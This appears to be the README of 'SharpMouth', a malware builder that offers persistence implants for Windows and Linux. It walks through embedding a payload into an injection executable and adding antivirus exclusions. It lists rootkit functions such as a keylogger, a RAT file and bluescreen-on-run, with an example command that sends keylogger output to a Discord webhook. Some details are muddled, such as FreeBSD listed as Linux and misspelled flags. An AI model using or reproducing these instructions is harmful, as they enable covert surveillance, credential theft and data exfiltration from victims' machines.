# SharpMouth
SharpMouth is a collection of persists for Windows and Linux (FreeBSD, Proprietary Linux)

# Persistent Installation (Windows)

NOTE: The files located in /shar/ are the persistent files used for the SharpMouth persistence.

1. Download a Windows Persistence from /shar/
2. Download the SharpMouth Builder (Sharp-En-GB.exe)
3. Open Terminal or CMD
4. CD into Downloads Folder (or Download location)
5. Prepare the following commands:
* Sharp-En-GB.exe Install-Update Sharp-En-GB.exe -s
* Sharp-En-GB.exe Install-Recursive-Resource -Add-MpPreference
* Sharp-En-GB.exe Embed-Allow -Resursive:True -s
6. Run the following commands:
* Sharp-En-GB.exe Recursive-Install /Embed-Files <Injection-File.exe> <Sharp-Persist-File.0>
* Sharp-En-GB.exe Recursive-Install /Build-Now <Injection-File.exe>

NOTE: If you would like to add custom rootkit function, follow the steps below:
* Prepare the Injection-File.exe (EXE file that will contain the Persistent) and the Sharp-Persist.0 File (Persistent).
List of Rootkit Functions:
Keylogger
Discord-Log
Network-Crawl
Rat-File
Error-Box
Bluescreen-On-Run
* Run the following commands:
Sharp-En-GB.exe Recursive-Install <Sharp-Persist.0> /New-Function:<FUNCTION-NAME> /Resource-Send:<WEBHOOK-OR-TOKEN>
Example: Sharp-En-GB.exe Recursive-Install Sharp-Persist.0 /New-Function:Keylogger /Resource-Send:https://discord.com/webhooks/1033781578/ABC

* After you embed the functions, please install the build with the normal Persistent Installation.
